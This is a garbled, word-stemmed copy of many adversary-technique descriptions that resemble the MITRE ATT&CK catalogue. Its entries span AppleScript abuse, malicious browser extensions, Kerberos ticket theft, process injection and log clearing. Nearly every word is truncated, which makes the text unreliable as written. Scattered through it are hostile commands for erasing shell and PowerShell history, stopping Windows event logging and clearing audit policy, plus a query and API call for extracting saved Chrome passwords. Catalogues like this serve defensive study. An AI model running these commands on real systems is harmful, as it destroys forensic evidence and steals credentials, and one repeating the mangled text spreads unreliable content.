advers abus applescrib execut applescrib maco script langu design control apply part o via inter-application mess cal appleev appl applescrib appleev mess send independ easy script applescrib ev loc op window send keystrok interact almost op apply loc remot script run command-line via < cod > osascrib /path/to/script < /code > < cod > osascrib -e script < /code > asid command lin script execut num way includ mail rul calendar.app alarm autom workflow applescrib also execut plain text shel script ad < cod > /usr/bin/osascript < /code > start script fil sentinelon applescrib applescrib nee cal < cod > osascrib < /code > execut howev execut within mach-o bin us maco nat ap http < cod > nsapplescrib < /code > < cod > osascrib < /code > execut cod independ < cod > /usr/bin/osascript < /code > command lin util advers abus applescrib execut vary behavy interact op ssh connect mov remot machin ev pres us fak dialog box ev start apply remot start loc interact apply 're already run remot maco 10.10 yosemit high applescrib abl execut nat ap http otherw would requir compil execut mach-o bin fil form sentinelon maco red team sint script langu us launch common techn wel revers shel via python http macro malw target mac
brows extend
advers abus internet brows extend est persist access victim system brows extend plugin smal program ad funct custom aspect internet brows inst direct brows ap stor gen access permit everyth brows access wikiped brows extend chrome extend definit malicy extend inst brows malicy ap stor download masquerad legitim extend soc engin advers already comprom system sec limit brows ap stor difficult malicy extend def autom scan malicy chrome extend numb depend brows advers also manip extend upd url instal upd advers control serv manip mobl config fil sil instal addit extend prevy maco 11 advers could sil instal brows extend via command lin us < cod > profil < /code > tool instal malicy < cod > .mobileconfig < /code > fil maco 11+ us < cod > profil < /code > tool long instal config profil howev < cod > .mobileconfig < /code > fil plant inst us interact xorry chrome extend maco extend inst brows websit background ste inform us ent brows includ cred us instal rat persist chrome extend crypto min icebrg chrome extend bank googl chrome extend ste cred catch chrome extend also inst botnet us persist backdo malicy chrome extend stantinko botnet also simil exampl extend us command control chrome extend c2 malw
serv exhaust flood
advers target diff network serv provid system conduc den serv do advers oft target avail dns web serv howev oth target wel arb annualdosreport jan 2018 web serv softw attack vary mean apply gen oth spec softw us provid serv on exampl typ attack know simpl http flood advers send larg numb http request web serv overwhelm and/or apply run top flood rely raw volum accompl object exhaust vary resourc requir victim softw provid serv cloudfl httpflood anoth vary know ssl renegoty attack tak adv protocol feat ssl/tls ssl/tls protocol suit includ mech cli serv agr encrypt algorithm us subsequ sec connect ssl renegoty en request mak renegoty crypto algorithm renegoty attack advers est ssl/tls connect process mak sery renegoty request cryptograph renegoty mean cost comput cyc caus impact avail serv do volum arb ssldos april 2012
comprom hardw supply chain
advers manip hardw compon produc pri receipt fin consum purpos dat system comprom mod hardw firmw supply chain advers insert backdo consum network difficult detect giv advers high degr control system hardw backdo insert vary dev serv workst network infrastruct periph
nat ap
advers interact nat o apply program interfac ap execut behavy nat ap provid control mean cal low-level o serv within kernel involv hardware/devices mem process nt ap window linux kernel ap nat ap lev o system boot system compon yet init wel carry task request routin op nat ap funct < cod > ntcreateprocess < /code > direct invok via system cal / syscal feat also oft expos user-mode apply via interfac libr outflank system cal cyberbit system cal mdsec system cal exampl funct window ap < cod > createprocess < /code > gnu < cod > fork < /code > allow program script start process microsoft createprocess gnu fork allow ap cal execut bin run cli command load mod etc thousand simil ap funct ex vary system op microsoft win32 libc glibc high level softw framework microsoft .net maco coco also avail interact nat ap framework typ provid langu wrappers/abstraction ap funct design ease-of-use/portability cod microsoft net appl cor serv maco coco maco found advers abus o ap funct mean execut behavy simil command script interpret http nat ap hierarchy interfac provid mech interact util vary compon victim system invok ap funct advers also attempt bypass defend tool ex unhook monit funct via dis mod tool http
clear network connect hist config
advers clear remov evid malicy network connect ord cle trac op config set wel vary artifact highlight connect hist cre system behavy requir network connect remot serv http extern remot serv http defend us artifact monit otherw analys network connect cre advers network connect hist stor vary loc system exampl rdp connect hist stor window reg valu microsoft rdp remov < cod > hkey_current_user\software\microsoft\terminal serv client\default < /code > < cod > hkey_current_user\software\microsoft\terminal serv client\servers < /code > window also stor inform rec rdp connect fil < cod > c \users\\ usernam \documents\default.rdp < /code > ` c \users\ usernam \appdata\local\microsoft\terminal serv client\cache\ ` mor rdpieces simil maco linux host stor inform highlight connect hist system log stor ` /library/logs ` and/or ` /var/log/ ` appl culprit access freedesktop journ appl un log analys remot login screen shar malicy network connect also requir chang network config set dis mod system firewal http tamp en proxy http advers delet mod dat cont ind and/or imp defend analys
as-rep roast
advers rev cred account dis kerbero preauth password crack http kerbero mess harmj0y roast as-rep jan 2017 preauth off protect offlin password crack http en us request access resourc in commun domain control dc send auth serv request as-req mess timestamp encrypt hash password dc abl success decrypt timestamp hash us ’ password send auth serv respons as-rep mess contain ticket grant ticket tgt us part as-rep mess sign us ’ password microsoft kerbero preau 2014 account find without preauth advers send as-req mess without encrypt timestamp receiv as-rep mess tgt dat encrypt insec algorithm rc4 recov encrypt dat vuln offlin password crack http attack simil kerberoast http expos plaintext cred harmj0y roast as-rep jan 2017 stealthbit crack as-rep roast jun 2019 account reg domain without spec privileg abus list domain account preauth dis util window tool lik powershel http ldap filt altern advers send as-req mess us dc respond without er account requir preauth as-rep mess already contain encrypt dat harmj0y roast as-rep jan 2017 stealthbit crack as-rep roast jun 2019 crack hash en persist http privileg esc http lat mov http via access valid account http san attack kerbero nov 2014
serv reg permit weak
window stor loc serv config inform reg < cod > hklm\system\currentcontrolset\services < /code > inform stor serv reg key manip mod serv execut paramet tool serv control sc.exe powershel http reg http access reg key control access control list permit msdn reg key sec permit us group prop set allow access reg key serv advers chang serv binpath/imagepa point diff execut control serv start restart adversary-controlled program execut allow advers gain persist and/or privileg esc account context serv set execut local/domain account system localserv networkserv advers also alt reg key assocy serv fail paramet < cod > failurecommand < /code > execut elev context anytim serv fail int corrupt trustedsign serv fail twit serv recovery nov 2017
virt priv serv
advers comprom third-party virt priv serv vpss us target ex vary cloud serv provid sel virt machines/container serv advers comprom vpss purchas third-party ent comprom vps us infrastruct advers mak difficult phys tie back op nsa ncsc turl oilrig comprom vps us lat stag advers lifecyc command control allow advers benefit ub trust assocy high reput cloud serv provid wel ad comprom third-party
reduc key spac
advers reduc level effort requir decrypt dat transmit network reduc ciph strength encrypt commun cisco syn knock evolv advers weak encrypt softw comprom network dev reduc key siz us softw convert plaintext ciphertext hundr thousand byt coupl byt result advers dram reduc amount effort nee decrypt protect inform without key advers mod key siz us encrypt paramet us spec command network dev cli http introduc system mod system im http chang config dev cisco blog leg dev attack
clear command hist
addit clear system log advers clear command hist comprom account cont act undertak intrud vary command interpret keep track command us typ termin us retrac 've do linux maco command hist access diff way log command hist track fil point environ vary < cod > histfil < /code > us log system inform flush fil us hom direct cal < cod > ~/.bash_history < /code > benefit allow us go back command 've us diff sess advers delet command log man clear hist < cod > hist -c < /code > delet bash hist fil < cod > rm ~/.bash_history < /code > advers also lev network dev cli http network dev clear command hist dat < cod > clear log < /code > and/or < cod > clear hist < /code > us-cert-ta18-106a window host powershel two diff command hist provid built-in hist command hist man < cod > psreadline < /code > mod built-in hist track command us cur sess command hist avail sess delet sess end < cod > psreadline < /code > command hist track command us powershel sess writ fil < cod > env appdata\microsoft\windows\powershell\psreadline\consolehost_history.txt < /code > default hist fil avail sess contain past hist sint fil delet sess end microsoft powershel command hist advers run powershel command < cod > clear-history < /code > flush entir command hist cur powershel sess howev delete/flush < cod > consolehost_history.txt < /code > fil advers also delet < cod > consolehost_history.txt < /code > fil edit cont hid powershel command run sopho powershel command audit sopho powershel command hist forens
indirect command execut
advers abus util allow command execut bypass sec restrict limit us command-line interpret vary window util us execut command poss without invok cmd http exampl forfil http program compat assist pcalua.exe compon window subsystem linux wsl wel util invok execut program command command script interpret http run window via script vectorsec forfil aug 2017 evi1cg forfil nov 2017 advers abus feat defens evas http spec perform arbit execut subvert detect and/or mitig control group policy limit/prev us cmd http fil extend common assocy malicy payload
custom cryptograph protocol
advers us custom cryptograph protocol algorithm hid command control traff simpl scheme xor-ing plaintext fix key produc weak ciphertext custom encrypt scheme vary soph analys revers engin malw sampl enough discov algorithm encrypt key us advers also attempt impl vert well-known cryptograph algorithm instead us know impl libr lead unint er f-secure cosmicduk
revert cloud inst
advers revert chang mak cloud inst perform malicy act attempt evad detect remov evid pres high virt environ cloud-bas infrastruct accompl rest virt machin vm dat stor snapshot cloud man dashboard cloud ap anoth vary techn util temp stor attach comput inst cloud provid provid vary typ stor includ persist loc and/or ephem ephem typ oft reset upon stop/restart vm tech republ - rest aw snapshot googl - rest cloud snapshot
reply remov med
advers mov onto system poss disconnect air-gapped network cop malw remov med tak adv autorun feat med insert system execut cas lat mov occ mod execut fil stor remov med cop malw renam look lik legitim fil trick us execut sep system cas init access occ man manip med mod system us init form med mod med firmw mobl dev also us infect pc malw connect via usb exploit smartphon usb infect achiev us dev android io etc inst usb charg cabl window malw infect android iphon charg cabl hack exampl smartphon connect system appear mount simil usb-connected disk driv malw compat connect system mobl dev malw could infect machin espec autorun feat en
dat loc system
advers search loc system sourc fil system config fil loc databas find fil interest sensit dat pri exfilt advers us command script interpret http cmd http wel network dev cli http funct interact fil system gath inform advers also us autom collect http loc system
deobfuscate/decod fil inform
advers us obfusc fil inform http hid artifact intrud analys requir sep mech decod deobfusc inform depend intend us method includ built-in funct malw us util pres system on exampl us certutil http decod remot access tool port execut fil hid insid cert fil malwarebyt target attack saud arab anoth exampl us window < cod > cop /b < /code > command reassembl bin frag malicy payload carbon black obfusc sept 2016 sometim us act requir op deobfusc decrypt part us execut http us also requir input password op password protect compressed/encrypt fil provid advers volex powerduk novemb 2016
outlook rul
advers abus microsoft outlook rul obtain persist comprom system outlook rul allow us defin autom behavy man email mess benign rul might exampl autom mov email particul fold outlook contain spec word spec send malicy outlook rul cre trig cod execut advers send spec craft email us silentbreak outlook rul malicy rul ad us ’ mailbox load outlook start malicy rul execut advers send spec craft email us silentbreak outlook rul
impair defens
advers malicy mod compon victim environ ord hind dis defend mech involv impair prev defens firewal anti-virus also detect cap defend us audit act ident malicy behavy also span nat defens wel suppl cap inst us admin advers could also target ev aggreg analys mech otherw disrupt proc alt system compon
cloud account
advers comprom cloud account us target advers us comprom cloud account op includ lev cloud stor serv dropbox microsoft onedr aw s3 bucket exfilt cloud stor http upload tool http s. cloud account also us acquisit infrastruct virt priv serv http serverless http infrastruct comprom cloud account allow advers develop soph cap without man serv awak sec c2 cloud vary method ex comprom cloud account gath cred via phish inform http purchas cred third-party sit conduc password spray http attack attempt ste apply access tok http s. mstic nobel oct 2021 pri comprom cloud account advers conduc reconnaiss inform decid account comprom op cas advers target privileg serv provid account int lev trust rel http serv provid custom mstic nobel oct 2021
email account
advers comprom email account us target advers us comprom email account op lev conduc phish inform http phish http util ex person comprom email account engend level trust pot victim rel knowledg comprom person comprom email account also us acquisit infrastruct ex domain http vary method ex comprom email account gath cred via phish inform http purchas cred third-party sit brut forc cred ex password reus breach cred dump anonhbg pri comprom email account advers conduc reconnaiss inform decid account comprom op advers us comprom email account hijack ex email thread target interest
upload malw
advers upload malw third-party advers control infrastruct mak access target malicy softw includ payload drop post-compromise tool backdo vary malicy cont advers upload malw support op mak payload avail victim network en ingr tool transf http plac internet access web serv malw plac infrastruct prevy purchased/rent advers acquir infrastruct http otherw comprom comprom infrastruct http malw also stag web serv github pastebin volex oc lot novemb 2020 advers upload backdo fil apply bin virt machin im contain im third-party softw stor reposit ex github cnet aw commun am dock hub chant encount victim direct download/install backdo fil via us execut http masquerad http increas chant us mistak execut fil
supply chain comprom
advers manip produc produc delivery mech pri receipt fin consum purpos dat system comprom supply chain comprom tak plac stag supply chain includ manip develop tool manip develop environ manip sourc cod reposit publ priv manip sourc cod open-source depend manip softw update/distribution mech compromised/infect system im multipl cas remov med infect fact ibm storw schneider elect usb malw replac legitim softw mod vert sal modified/counterfeit produc legitim distribut ship interdict supply chain comprom impact compon hardw softw advers look gain execut oft foc malicy addit legitim softw softw distribut upd channel avast ccleaner3 2018 microsoft dofoil 2018 command fiv sk 2011 target spec desir victim set malicy softw distribut broad set consum mov addit tact spec victim symantec elderwood sept 2012 avast ccleaner3 2018 command fiv sk 2011 popul op sourc project us depend many apply also target mean ad malicy cod us depend trendmicro npm comprom
exploit public-facing apply
advers attempt tak adv weak internet-facing comput program us softw dat command ord caus unintend unanticip behavy weak system bug glitch design vuln apply oft websit includ databas lik sql standard serv lik smb ssh network dev admin man protocol lik snmp smart instal apply internet access op socket web serv rel serv nvd cve-2016-6662 ci multipl smb vuln us-cert ta18-106 network infrastruct dev 2018 cisco blog leg dev attack nvd cve-2014-7169 depend flaw exploit includ exploit defens evas http apply host cloud-bas infrastruct and/or contain exploit lead comprom und inst contain allow advers path access cloud contain ap exploit contain host access via escap host http tak adv weak id access man policy websit databas owasp top 10 cwe top 25 highlight common web-based vuln owasp top 10 cwe top 25
ste forg kerbero ticket
advers attempt subvert kerbero auth ste forg kerbero ticket en pas ticket http kerbero auth protocol wid us modern window domain environ kerbero environ ref “ realm ” three bas particip cli serv key distribut cent kdc adsec kerbero ring decod cli request access serv exchang kerbero ticket origin kdc grant access success auth kdc respons auth ticket grant advers attempt abus kerbero ste ticket forg ticket en unauth access window built-in < cod > klist < /code > util us list analys cach kerbero ticket microsoft klist linux system act direct domain stor kerbero cred loc cred cach fil ref ccach cred stor ccach fil remain valid gen us sess last mit ccach modern redh enterpr linux system der distribut system sec serv daemon sssd handl kerbero ticket default sssd maintain cop ticket databas find < cod > /var/lib/sss/secrets/secrets.ldb < /code > wel correspond key loc < cod > /var/lib/sss/secrets/.secrets.mkey < /code > fil requir root access read advers abl access databas key cred cach kerbero blob extract convert us kerbero ccach fil advers us pas ticket http ccach fil also convert window form us tool kekeo linux kerbero ticket brin mimikatz unix kekeo kerbero ticket maco stor standard ccach form simil linux default access ccach entry fed kcm daemon process via mach rpc protocol us cal environ determin access stor loc ccach entry influ < cod > /etc/krb5.conf < /code > config fil < cod > krb5ccname < /code > environ vary spec sav disk keep protect via kcm daemon us interact ticket stor us < cod > kinit < /code > < cod > klist < /code > < cod > ktutil < /code > < cod > kcc < /code > built-in bin via appl nat kerbero framework advers us op sourc tool interact ccach fil direct us kerbero framework cal lower-level ap extract us tgt serv ticket spectorop bifrost kerbero maco 2019 maco kerbero framework mit
cred password stor
advers search common password stor loc obtain us cred password stor sev plac system depend op system apply hold cred also spec apply stor password mak easy us man maintain cred obtain us perform lat mov access restrict inform
exfilt web serv
advers us ex legitim extern web serv exfilt dat rath prim command control channel popul web serv act exfilt mech giv sign amount cov due lik host within network already commun pri comprom firewal rul also already ex permit traff serv web serv provid also common us ssl/tls encrypt giv advers ad level protect
remot access softw
advers us legitim desktop support remot access softw team view anydesk go2assist logmein ammyyadmin etc est interact command control channel target system within network serv common us legitim techn support softw allow apply control within target environ remot access tool lik vnc ammyy teamview us frequ comp legitim softw common us advers symantec liv land remot access tool inst us post-compromise altern commun channel redund access way est interact remot desktop sess target system also us compon malw est revers connect back-connect serv advers control system instal many remot access tool also includ persist ex tool instal routin cre window serv http admin tool teamview us sev group target institut country interest russ stat crimin campaign crowdstrik 2015 glob threat report crysy blog teamspy
domain
advers acquir domain us target domain nam hum read nam us repres on ip address purchas cas acquir fre advers us acquir domain vary purpos includ phish http drive-by comprom http command control cis ms sep 2020 advers choos domain simil legitim domain includ us homoglyph us diff top-level domain tld fireey apt28 paypalscam typosquat us aid delivery payload via drive-by comprom http advers also us intern domain nam idn diff charact set e.g cyril greek etc execut idn homograph attack cre vis simil lookalik domain us del malw victim machin cis idn st05-016 tt_httrack_fake_domains tt_obliquerat httrack_unhcr lazgroup_idn_phishing advers also acquir repurpos expir domain pot already allowlisted/trust defend bas ex reputation/history categorisation_not_boundary domain_steal_cc redirectors_domain_fronting bypass_webproxy_filtering domain registr maintain publ view databas display contact inform every reg domain priv who serv display altern inform company dat rath own domain advers us priv who serv obsc inform own purchas domain advers interrupt effort track infrastruct us vary reg inform purchas domain diff domain registr mandy apt1
arch via libr
advers compress encrypt dat collect pri exfilt us 3rd party libr many libr ex arch dat includ python http rarfil pyp rar libzip libzip zlib zlib github libr includ funct encrypt and/or compress dat arch libr preinstal system bzip2 maco linux zip window not libr diff util libr link compil util requir spawn subshel simil execut mech
thread execut hijack
advers inject malicy cod hijack process ord evad process-based defens wel poss elev privileg thread execut hijack method execut arbit cod address spac sep liv process thread execut hijack common perform suspend ex process unmapping/hollow mem replac malicy cod path dll handl ex victim process first cre nat window ap cal < cod > openthread < /code > point process suspend writ realign inject cod resum via < cod > suspendthread < /code > < cod > virtualallocex < /code > < cod > writeprocessmem < /code > < cod > setthreadcontext < /code > < cod > resumethread < /code > respect elast process inject july 2017 simil process hollow http target ex process rath cre process suspend stat run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via thread execut hijack also evad detect sec produc sint execut mask legitim process
multilay encrypt
advers perform c2 commun us multipl lay encrypt typ exclud tunnel custom encrypt scheme within protocol encrypt scheme http smtps
masquerad
advers attempt manip feat artifact mak appear legitim benign us and/or sec tool masquerad occ nam loc object legitim malicy manip abus sak evad defens observ includ manip fil metadat trick us misident fil typ giv legitim task serv nam renam abus system util evad sec monit also form masquerad http lolba main sit
apply shim
advers est persist and/or elev privileg execut malicy cont trig apply shim microsoft window apply compat infrastructure/framework apply shim cre allow backward compat softw op system codebas chang tim exampl apply shim feat allow develop apply fix apply without rewrit cod cre window xp work window 10 elast process inject july 2017 within framework shim cre act buff program spec import address tabl window o program execut shim cach ref determin program requir us shim databas .sdb shim databas us hook redirect cod necess ord commun o list shim cur inst default window instal sdbinst.exe keep < cod > windir \apppatch\sysmain.sdb < /code > < cod > hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb < /code > custom databas stor < cod > windir \apppatch\custom windir \apppatch\apppatch64\custom < /code > < cod > hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom < /code > keep shim sec window design run us mod mod kernel must admin privileg instal shim howev certain shim us bypass us account control http uac redirectex inject dlls process injectdl dis dat execut prev disablenx structure exceiv handl disableseh interceiv mem address getprocaddress util shim allow advers perform sev malicy act elev privileg instal backdo dis defens lik window defend etc fireey apply shim shim also abus est persist continu invok affect program
unsec cred
advers search comprom system find obtain insec stor cred cred stor and/or misplac many loc system includ plaintext fil e.g bash hist http op system application-specific reposit e.g cred reg http spec files/artifact e.g priv key http
port monit
advers us port monit run advers supply dll system boot persist privileg esc port monit set < cod > addmonit < /code > ap cal set dll load startup addmonit dll loc < cod > c \windows\system32 < /code > load print spool serv spoolsv.exe boot spoolsv.exe process also run system level permit bloxham altern arbit dll load permit allow writ fully-qualified pathnam dll < cod > hklm\system\currentcontrolset\control\print\monitors < /code > reg key contain entry follow loc port standard tcp/ip port usb monit wsd port advers us techn load malicy cod startup persist system reboot execut system
clear mailbox dat
advers mod mail apply dat remov evid act email apply allow us program export delet mailbox dat via command lin tool us ap mail apply dat email log gen apply op system export request advers manip email mailbox dat remov log artifact evid phish http / intern spearph http email collect http mail protocol http command control email-based exfilt exfilt altern protocol http exampl remov evid exchang serv advers us < cod > exchangepowershel < /code > powershel http mod includ < cod > remove-mailboxexportrequest < /code > remov evid mailbox export volex solarwind exchangepowershel mod linux maco advers also delet email command lin util cal < cod > mail < /code > us applescrib http interact ap maco cybereason cobalt kitty 2017 mailx man pag
login hook
advers us login hook est persist execut upon us logon login hook plist fil point spec script execut root privileg upon us logon plist fil loc < cod > /library/preferences/com.apple.loginwindow.plist < /code > fil mod us < cod > default < /code > command-line util behavy logout hook script execut upon us logout hook requir admin permit mod cre hook login script appl dev loginwindowscrib appl dev advers ad insert path malicy script < cod > com.apple.loginwindow.plist < /code > fil us < cod > loginhook < /code > < cod > logouthook < /code > key-value pair malicy script execut upon next us login login hook already ex advers ad addit command ex login hook on login logout hook system tim s1 maco persist wardl persist chapt not login hook deprec 10.11 vert maco fav launch daemon http launch ag http
process inject
advers inject cod process ord evad process-based defens wel poss elev privileg process inject method execut arbit cod address spac sep liv process run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via process inject also evad detect sec produc sint execut mask legitim process many diff way inject cod process many abus legitim funct impl ex every maj o typ platform spec soph sampl perform multipl process inject seg mod evad detect util nam pip inter-process commun ipc mech commun channel
bash hist
bash keep track command us typ command-line hist util us log hist flush us ’ < cod > .bash_history < /code > fil us fil resid loc < cod > ~/.bash_history < /code > typ fil keep track us ’ last 500 command us oft typ usernam password command-line paramet program get sav fil log attack abus look fil pot cred extern da o x way
traff sign
advers us traff sign hid op port malicy funct us persist command control traff sign involv us mag valu sequ must send system trig spec respons op clos port execut malicy task tak form send sery packet certain charact port op advers us command control us sery packet consist attempt connect predefin sequ clos port i.e port knock http involv unus flag spec string un charact sequ complet op port accompl host-based firewal could also impl custom softw advers also commun already op port serv list port respond command trig malicy funct pass appropry mag valu observ sign packet trig commun conduc diff method on mean origin impl cd00r hartrel cd00r 2002 us libpcap libr sniff packet quest anoth method lev raw socket en malw us port already op us program network dev advers us craft packet en network dev auth http standard serv off dev telnet sign also us op clos serv port telnet trig mod mod malw impl dev ad remov chang malicy cap advers us craft packet attempt connect on op clos port also attempt connect rout interfac broadcast network address ip port ord achiev goal object cisco syn knock evolv mandy - syn knock cisco blog leg dev attack en traff sign emb dev advers must first achiev lev patch system im http due monolith nat architect advers also us wake-on-lan feat turn pow system wake-on-lan hardw feat allow pow system pow wak send mag packet system pow becom target lat mov bleep comput - ryuk wol amd mag packet
cred web brows
advers acquir cred web brows read fil spec target brows talo olymp destroy 2018 web brows common sav cred websit usernam password nee ent man fut web brows typ stor cred encrypt form within cred stor howev method ex extract plaintext cred web brows exampl window system encrypt cred obtain googl chrome read databas fil < cod > appdata\local\google\chrome\user data\default\login dat < /code > execut sql query < cod > select action_url username_valu password_value login < /code > plaintext password obtain pass encrypt cred window ap funct < cod > cryptunprotectdat < /code > us victim ’ cach logon cred decrypt key microsoft cryptunprotectdat april 2018 advers execut simil proc common web brows firefox safar edg etc proofpoint veg cred ste 2018 fireey hawkey malw july 2017 advers also acquir cred search web brows process mem pattern common match cred github mimikittenz july 2016 acquir cred web brows advers attempt recyc cred across diff system and/or account ord expand access result sign furth advers object cas cred gain web brows overlap privileg account e.g domain admin
system bin proxy execut
advers bypass process and/or signature-based defens proxy execut malicy cont sign otherw trust bin bin us techn oft microsoft-signed fil ind eith download microsoft already nat op system lolba project bin sign trust digit cert typ execut window system protect digit sign valid sev microsoft sign bin default window instal us proxy execut fil command simil linux system advers abus trust bin < cod > split < /code > proxy execut malicy command split man pag gtfo split
sourc
techn deprec long us < cod > sourc < /code > command load funct cur shel execut fil cur context built-in command run two diff way < cod > sourc /path/to/filename argu < /code > < cod > techn deprec long us /path/to/filename argu < /code > tak not spac without spac new shel cre run program instead run program within cur context oft us mak certain feat funct avail shel upd spec shel environ sourc man advers abus funct execut program fil execut techn nee mark execut beforehand
dll search ord hijack
window system us common method look requir dlls load program microsoft dll search advers tak adv window dll search ord program ambigu spec dlls gain privileg esc persist advers perform dll preload also cal bin plant attack owasp bin plant plac malicy dll nam ambigu spec dll loc window search legitim dll oft loc cur work direct program remot dll preload attack occ program set cur direct remot loc web shar load dll microsoft 2269637 advers us behavy caus program load malicy dll advers also direct mod way program load dlls replac ex dll mod .manifest .local redirect fil direct junct caus program load diff dll maintain persist privileg esc microsoft dll redirect microsoft manifest mandy search ord search order-vulnerable program config run high privileg level adversary-controlled dll load also execut high level cas techn could us privileg esc us admin system admin system depend program program fal victim path hijack appear behav norm malicy dlls config also load legitim dlls mean replac
new serv
op system boot start program apply cal serv perform background system funct technet serv serv config inform includ fil path serv execut stor window reg advers instal new serv config execut startup us util interact serv direct mod reg serv nam disgu us nam rel op system benign softw masquerad http serv cre admin privileg execut system privileg advers also us serv esc privileg admin system advers also direct start serv serv execut http
timestomp
advers mod fil tim attribut hid new chang ex fil timestomp techn mod timestamp fil mod access cre chang tim oft mim fil fold do exampl fil mod cre advers appear conspicu forens investig fil analys tool timestomp us along fil nam masquerad http hid malw tool windowsir anti-forensic techn
reflect cod load
advers reflect load cod process ord cont execut malicy payload reflect load involv alloc execut payload direct within mem process vic cre thread process back fil path disk reflect load payload compil bin anonym fil pres ram snub fileless execut cod ex position-independent shellcod introduc donut s1 custom shellcod tool stuart elf mem 00sec drop mandy byol reflect cod inject simil process inject http exceiv “ inject ” load cod process ’ mem instead sep process reflect load evad process-based detect sint execut arbit cod mask within legitim otherw benign process reflect load payload direct mem also avoid cre fil artifact disk also en malw keep payload encrypt otherw obfusc execut stuart elf mem 00sec drop intez acbackdo s1 old rat new trick
escap host
advers break contain gain access und host allow advers access contain resourc host level host principl contain resourc provid clear sep apply funct isol host environ dock overview multipl way advers escap host environ exampl includ cre contain config mount host ’ filesystem us bind paramet allow advers drop payload execut control util cron host util privileg contain run command load malicy kernel mod und host abus system cal ` unsh ` ` keyctl ` esc privileg ste secret dock bind mount trend micro privileg contain intez dok july 20 contain escap crowdstrik kubernet contain escap keyctl-unmask addit advers abl exploit comprom contain mount contain man socket ` docker.sock ` break contain via contain admin command http contain escap advers also escap via exploit privileg esc http exploit vuln glob symbol link ord access root direct host machin window serv contain op gain access host provid advers opportun achiev follow-on object est persist mov lat within environ set command control channel host
shortcut mod
advers cre mod shortcut execut program system boot us login shortcut symbol link us ref fil program op execut shortcut click execut system startup process advers abus shortcut startup fold execut tool achiev persist shortcut persist although oft us payload infect chain e.g spearph attach http advers also cre new shortcut mean indirect also abus masquerad http mak malicy shortcut appear legitim program advers also edit target path entir replac ex shortcut malw execut instead intend legitim program shortcut also abus est persist impl method exampl lnk brows extend mod e.g brows extend http persist launch malw
apply window discovery
advers attempt get list op apply window window list could convey inform system us giv context inform collect keylog prevail darkwatchm 2021
standard cryptograph protocol
advers explicit employ know encrypt algorithm cont command control traff rath rely inh protect provid commun protocol despit us sec algorithm impl vuln revers engin necess secret key encod and/or gen within malw samples/configuration fil
email account
advers attempt get list email address account advers try dump exchang address list glob address list gal microsoft exchang address list on-premises exchang exchang onlin < cod > get-globaladdressl < /code > powershel cmdlet us obtain email address account domain us auth sess microsoft getglobaladdressl black hil attack exchang mailsnip 2016 googl workspac gal shar microsoft outlook us googl workspac synt microsoft outlook gwsmo serv addit googl workspac direct allow us get list us within org googl workspac glob access list
hyperv
techn deprec long us type-1 hyperv softw lay sit guest op system system hardw wikiped hyperv pres virt run environ op system exampl common hyperv xen wikiped xen type-1 hyperv op level op system could design rootkit http funct hid ex guest op system myer 2007 malicy hyperv nat could us persist system interrupt
tim bas evas
advers employ vary time-based method detect avoid virt analys environ includ enum time-based property uptim system clock wel us tim trig avoid virt machin environ vme sandbox spec autom op limit amount tim advers employ vary time-based evas delay malw funct upon init execut us program sleep command nat system schedule funct ex schedule task/job http delay also bas wait spec victim condit meet ex system tim ev etc employ schedule multi-stage channel http avoid analys scrutiny deloit environ aw benign command op also us delay malw execut loop otherw needl repetit command ping http us delay malw execut pot excess tim threshold autom analys environ revil independ day netskop nitol anoth vary common ref ap ham involv mak vary cal nat ap http funct ord delay execut also pot overload analys environ junk dat joe sec nymaim joe sec trickbot advers also us tim met detect sandbox analys environ particul attempt manip tim mech sim long elaps tim exampl advers abl ident sandbox accel tim sampl calc expect valu environ timestamp execut sleep funct isac malw trick
appcert dlls
dynamic-link libr dlls spec appcertdl reg key < cod > hkey_local_machine\system\currentcontrolset\control\session man < /code > load every process cal ubiquit us apply program interfac ap funct createprocess createprocessasus createprocesswithloginw createprocesswithtokenw winexec elast process inject july 2017 simil process inject http valu abus obtain persist privileg esc caus malicy dll load run context sep process comput
cmstp
advers abus cmstp proxy execut malicy cod microsoft connect man profil instal cmstp.exe command-line program us instal connect man serv profil microsoft connect man oct 2009 cmstp.exe acceiv instal inform fil inf paramet instal serv profil lev remot access connect advers supply cmstp.exe inf fil infect malicy command twit cmstp us jan 2018 simil regsvr32 http / ” squiblydoo ” cmstp.exe abus load execut dlls msitpro cmstp aug 2017 and/or com scriptlets sct remot serv twit cmstp jan 2018 github ultim applock bypass list end cmstp july 2018 execut also bypass applock apply control defens sint cmstp.exe legitim bin sign microsoft cmstp.exe also abus bypass us account control http execut arbit command malicy inf auto-elevated com interfac msitpro cmstp aug 2017 github ultim applock bypass list end cmstp july 2018
ssh hijack
advers hijack legitim us ssh sess mov lat within environ sec shel ssh standard mean remot access linux maco system allow us connect anoth system via encrypt tunnel common auth password cert us asymmet encrypt key pair ord mov lat comprom host advers tak adv trust rel est system via publ key auth act ssh sess hijack ex connect anoth system occ comprom ssh ag access ag socket advers abl obtain root access hijack ssh sess lik triv slidesh abus ssh sshjack blackh clockwork ssh ag hijack breach post-mortem ssh hijack ssh hijack http diff us ssh http hijack ex ssh sess rath cre new sess us valid account http
dis window ev log
advers dis window ev log limit dat lev detect audit window ev log record us system act login attempt process cre much window log ev dat us sec tool analyst gen detect eventlog serv maintain ev log vary system compon apply eventlog_core_technologies default serv autom start system pow audit policy maintain loc sec policy secpol.msc defin system ev eventlog serv log sec audit policy set chang run secpol.msc navig < cod > sec settings\local policies\audit policy < /code > bas audit policy set < cod > sec settings\advanced audit policy config < /code > adv audit policy set audit_policy_microsoft advanced_sec_audit_policy_settings < cod > auditpol.exe < /code > also us set audit policy auditpol advers target system-wide log particul apply exampl eventlog serv dis us follow powershel lin < cod > stop-service -name eventlog < /code > disable_win_event_logging addit advers us < cod > auditpol < /code > sub-commands command prompt dis audit clear audit policy en dis spec set audit categ advers us < cod > /success < /code > < cod > /failure < /code > paramet exampl < cod > auditpol /set /category ” account logon ” /success dis /failure dis < /code > turn audit account logon categ auditpol.exe_strontic t1562.002_redcanaryco clear audit policy advers run follow lin < cod > auditpol /clear /y < /code > < cod > auditpol /remove /allusers < /code > t1562.002_redcanaryco dis window ev log advers op leav le evid comprom behind
schedule transf
advers schedule dat exfilt perform certain tim day certain interv could do blend traff pattern norm act avail schedule exfilt us exfilt techn lik apply wel transf inform network exfilt c2 channel http exfilt altern protocol http
smb/windows admin shar
